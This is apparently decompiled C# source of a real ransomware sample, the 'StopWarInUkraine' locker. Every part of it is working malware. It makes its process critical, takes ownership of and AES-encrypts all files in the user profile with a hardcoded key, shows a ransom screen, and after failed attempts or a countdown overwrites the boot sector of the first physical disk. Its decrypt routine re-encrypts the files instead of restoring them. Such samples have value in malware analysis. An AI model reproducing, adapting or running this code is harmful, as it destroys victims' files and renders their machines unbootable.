// Decompiled with JetBrains decompiler
// Type: lockuiransow.Form1
// Assembly: lockuiransow, Version=1.0.7.2, Culture=neutral, PublicKeyToken=null
// MVID: 62BF4CC8-49FA-4CFD-AD54-F74ED57E4209
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\Trojan-Ransom.Win32.Encoder.qfl-1fd2d0c7d504be306ecaaf6e852142ca053950c386e3fd6ee8a1f2138ed89312.exe

using lockuiransow.Properties;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace lockuiransow
{
  public class Form1 : Form
  {
    private int attempts = 10;
    private int ile = 10;
    private int m = 0;
    private int delay = 3600;
    private const uint GenericAll = 268435456;
    private const uint FileShareRead = 1;
    private const uint FileShareWrite = 2;
    private const uint OpenExisting = 3;
    private const uint MbrSize = 512;
    private IContainer components = (IContainer) null;
    private Label label1;
    private PictureBox pictureBox1;
    private PictureBox pictureBox2;
    private Label label2;
    private Label label3;
    private Label app;
    private Label timer;
    private TextBox textBox1;
    private Button button1;
    private Label label4;
    private Button button2;
    private Timer time_timer;

    public Form1() => this.InitializeComponent();

    private void MakeCritical()
    {
      int processInformation = 1;
      int processInformationClass = 29;
      Form1.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.MakeCritical();
      this.Hide();
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\StopWarInUkraineLocker");
      if (subKey.GetValue("EncryptedFiles") == null)
      {
        this.Encrypt();
        subKey.SetValue("EncryptedFiles", (object) 1, RegistryValueKind.DWord);
      }
      this.Show();
      this.time_timer.Start();
    }

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    private void Encrypt() => this.EncryptFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

    private void EncryptFiles(string Path)
    {
      foreach (string file in Directory.GetFiles(Path))
      {
        Process.Start(new ProcessStartInfo()
        {
          FileName = "takeown.exe",
          Arguments = "/f " + file
        }).WaitForExit();
        try
        {
          FileSecurity accessControl = File.GetAccessControl(file);
          accessControl.AddAccessRule(new FileSystemAccessRule((IdentityReference) WindowsIdentity.GetCurrent().User, FileSystemRights.FullControl, AccessControlType.Allow));
          File.SetAccessControl(file, accessControl);
        }
        catch (Exception ex)
        {
          throw;
        }
        this.EncryptFile(file, file + ".freeukraine");
      }
      foreach (string directory in Directory.GetDirectories(Path))
      {
        try
        {
          this.EncryptFiles(directory);
        }
        catch (Exception ex)
        {
          throw;
        }
      }
    }

    private void DecryptFiles(string Path)
    {
      foreach (string file in Directory.GetFiles(Path, "*.freeukraine"))
        this.DecryptFile(file, file.Remove(file.Length - 12, 12));
      foreach (string directory in Directory.GetDirectories(Path))
      {
        try
        {
          this.DecryptFiles(directory);
        }
        catch (Exception ex)
        {
          throw;
        }
      }
    }

    private void Decrypt() => this.EncryptFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

    private void EncryptFile(string inputFile, string outputFile)
    {
      try
      {
        byte[] bytes = new UnicodeEncoding().GetBytes("lockfile");
        FileStream fileStream1 = new FileStream(outputFile, FileMode.Create);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
        int num;
        while ((num = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num);
        fileStream2.Close();
        cryptoStream.Close();
        fileStream1.Close();
      }
      catch
      {
      }
    }

    private void DecryptFile(string inputFile, string outputFile)
    {
      try
      {
        byte[] bytes = new UnicodeEncoding().GetBytes("lockfile");
        FileStream fileStream1 = new FileStream(inputFile, FileMode.Open);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateDecryptor(bytes, bytes), CryptoStreamMode.Read);
        FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
        int num;
        while ((num = cryptoStream.ReadByte()) != -1)
          fileStream2.WriteByte((byte) num);
        fileStream2.Close();
        cryptoStream.Close();
        fileStream1.Close();
      }
      catch
      {
      }
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
      string lpFileName,
      uint dwDesiredAccess,
      uint dwShareMode,
      IntPtr lpSecurityAttributes,
      uint dwCreationDisposition,
      uint dwFlagsAndAttributes,
      IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
      IntPtr hFile,
      byte[] lpBuffer,
      uint nNumberOfBytesToWrite,
      out uint lpNumberOfBytesWritten,
      IntPtr lpOverlapped);

    public void MBR()
    {
      byte[] lpBuffer = new byte[512];
      IntPtr file = Form1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
      try
      {
        Form1.WriteFile(file, lpBuffer, 512U, out uint _, IntPtr.Zero);
        Form1.CloseHandle(file);
      }
      catch
      {
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (this.textBox1.Text.ToLower() == "stopwarinukraine")
      {
        ++this.m;
        if (this.m != this.ile)
          return;
        this.button2.Enabled = true;
      }
      else
      {
        this.m = 0;
        --this.attempts;
        this.app.Text = "Attempts: " + this.attempts.ToString();
        if (this.attempts == 0)
        {
          this.MBR();
          Environment.Exit(-1);
        }
      }
    }

    private void Window_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    private void button2_Click(object sender, EventArgs e)
    {
      RegistryKey subKey1 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      subKey1.SetValue("DisableTaskmgr", (object) 0, RegistryValueKind.DWord);
      subKey1.SetValue("DisableRegistryTools", (object) 0, RegistryValueKind.DWord);
      RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      subKey2.SetValue("EnableLUA", (object) 1, RegistryValueKind.DWord);
      subKey2.SetValue("legalnoticecaption", (object) "", RegistryValueKind.String);
      subKey2.SetValue("legalnoticetext", (object) "", RegistryValueKind.String);
      subKey2.Close();
      RegistryKey subKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
      subKey3.SetValue("userinit", (object) "userinit.exe");
      subKey3.Close();
      RegistryKey subKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
      subKey4.SetValue("DisableCmd", (object) 0, RegistryValueKind.DWord);
      subKey4.Close();
      RegistryKey subKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
      subKey5.SetValue("NoControlPanel", (object) 0, RegistryValueKind.DWord);
      subKey5.SetValue("NoRun", (object) 0, RegistryValueKind.DWord);
      subKey5.SetValue("NoWinKeys", (object) 0, RegistryValueKind.DWord);
      subKey5.Close();
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.FileName = "shutdown.exe";
      startInfo.Arguments = "-r -t 0";
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      this.Decrypt();
      Process.Start(startInfo);
    }

    private void time_timer_Tick(object sender, EventArgs e)
    {
      if (this.delay >= 0)
      {
        this.timer.Text = TimeSpan.FromSeconds((double) --this.delay).ToString("hh\\:mm\\:ss");
      }
      else
      {
        this.MBR();
        Environment.Exit(-1);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.label1 = new Label();
      this.pictureBox1 = new PictureBox();
      this.pictureBox2 = new PictureBox();
      this.label2 = new Label();
      this.label3 = new Label();
      this.app = new Label();
      this.timer = new Label();
      this.textBox1 = new TextBox();
      this.button1 = new Button();
      this.label4 = new Label();
      this.button2 = new Button();
      this.time_timer = new Timer(this.components);
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Location = new Point(502, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(432, 33);
      this.label1.TabIndex = 0;
      this.label1.Text = "StopWarInUkraine Ransowmare";
      this.label1.Click += new EventHandler(this.label1_Click);
      this.pictureBox1.Image = (Image) Resources.UkraineFlag;
      this.pictureBox1.InitialImage = (Image) Resources.UkraineFlag;
      this.pictureBox1.Location = new Point(266, 9);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(93, 54);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 1;
      this.pictureBox1.TabStop = false;
      this.pictureBox2.Image = (Image) Resources.UkraineFlag;
      this.pictureBox2.InitialImage = (Image) Resources.UkraineFlag;
      this.pictureBox2.Location = new Point(1059, 9);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(100, 54);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox2.TabIndex = 2;
      this.pictureBox2.TabStop = false;
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.label2.Location = new Point(481, 61);
      this.label2.Name = "label2";
      this.label2.Size = new Size(483, 200);
      this.label2.TabIndex = 3;
      this.label2.Text = "Your all files in encrypted.\r\n\r\nHow to decrypt files??\r\nWrite \"StopWarInUkraine\" 10 times in the key box\r\n\r\nYou have a week to enter.\r\n\r\nStop war in ukraine.";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.label3.Location = new Point(1309, 878);
      this.label3.Name = "label3";
      this.label3.Size = new Size(195, 25);
      this.label3.TabIndex = 4;
      this.label3.Text = "Author: CyberWord";
      this.app.AutoSize = true;
      this.app.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.app.Location = new Point(12, 392);
      this.app.Name = "app";
      this.app.Size = new Size(100, 20);
      this.app.TabIndex = 5;
      this.app.Text = "Attempts: 10";
      this.timer.AutoSize = true;
      this.timer.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.timer.Location = new Point(12, 421);
      this.timer.Name = "timer";
      this.timer.Size = new Size(126, 20);
      this.timer.TabIndex = 6;
      this.timer.Text = "Time: 7:00:00:00";
      this.textBox1.BackColor = System.Drawing.Color.SeaGreen;
      this.textBox1.Location = new Point(74, 737);
      this.textBox1.Multiline = true;
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(772, 36);
      this.textBox1.TabIndex = 7;
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.button1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.button1.Location = new Point(852, 737);
      this.button1.Name = "button1";
      this.button1.Size = new Size(75, 39);
      this.button1.TabIndex = 8;
      this.button1.Text = "Check";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.label4.AutoSize = true;
      this.label4.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.label4.Location = new Point(13, 745);
      this.label4.Name = "label4";
      this.label4.Size = new Size(54, 15);
      this.label4.TabIndex = 9;
      this.label4.Text = "Key Box:";
      this.button2.Enabled = false;
      this.button2.Location = new Point(490, 779);
      this.button2.Name = "button2";
      this.button2.Size = new Size(474, 68);
      this.button2.TabIndex = 10;
      this.button2.Text = "Decrypt";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.time_timer.Tick += new EventHandler(this.time_timer_Tick);
      this.AutoScaleDimensions = new SizeF(17f, 33f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.MediumSeaGreen;
      this.ClientSize = new Size(1516, 912);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.timer);
      this.Controls.Add((Control) this.app);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.pictureBox2);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.label1);
      this.Font = new Font("Microsoft Sans Serif", 21.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 238);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(8);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.FormClosing += new FormClosingEventHandler(this.Window_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
